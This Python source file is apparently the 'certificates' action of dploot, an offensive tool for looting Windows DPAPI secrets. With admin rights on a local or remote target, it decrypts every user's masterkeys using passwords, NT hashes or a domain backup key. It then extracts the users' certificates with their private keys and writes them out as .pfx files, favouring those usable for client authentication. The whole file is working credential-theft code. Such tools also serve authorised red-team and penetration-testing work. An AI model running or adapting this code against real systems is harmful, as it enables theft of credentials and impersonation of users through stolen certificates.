import argparse
import logging
from typing import Callable, Tuple
from dploot.action import DPLootAction
from dploot.action.masterkeys import add_masterkeys_argument_group
from dploot.lib.target import add_target_argument_group
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.certificates import CertificatesTriage
from dploot.triage.masterkeys import MasterkeysTriage

NAME = "certificates"


class CertificatesAction(DPLootAction):
    def __init__(self, options: argparse.Namespace) -> None:
        super().init_triage_user(options)

    def run(self) -> None:
        super().run()
        if self.conn.is_admin():
            if self.masterkeys is None:

                def masterkey_triage(masterkey):
                    masterkey.dump()

                masterkeytriage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    pvkbytes=self.pvkbytes,
                    nthashes=self.nthashes,
                    passwords=self.passwords,
                    per_masterkey_callback=masterkey_triage
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage ALL USERS masterkeys\n")
                self.masterkeys = masterkeytriage.triage_masterkeys()
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)

            def certificate_callback(certificate):
                if not self.options.dump_all and not certificate.clientauth:
                    return
                if not self.options.quiet:
                    certificate.dump()
                filename = f"{certificate.username}_{certificate.filename[:16]}.pfx"
                logging.critical("Writting certificate to %s" % filename)
                if not self.options.quiet:
                    print()  # better outputing
                with open(filename, "wb") as f:
                    f.write(certificate.pfx)

            triage = CertificatesTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_certificate_callback=certificate_callback,
            )
            logging.info("Triage Certificates for ALL USERS\n")
            triage.triage_certificates()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, triage.looted_files)
                
        else:
            logging.info("Not an admin, exiting...")

def entry(options: argparse.Namespace) -> None:
    a = CertificatesAction(options)
    a.run()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME, help="Dump users certificates from local or remote target"
    )

    group = subparser.add_argument_group("certificates options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    add_masterkeys_argument_group(group)

    group.add_argument(
        "-dump-all",
        action="store_true",
        help=("Dump also certificates not used for client authentication"),
    )

    add_target_argument_group(subparser)

    return NAME, entry
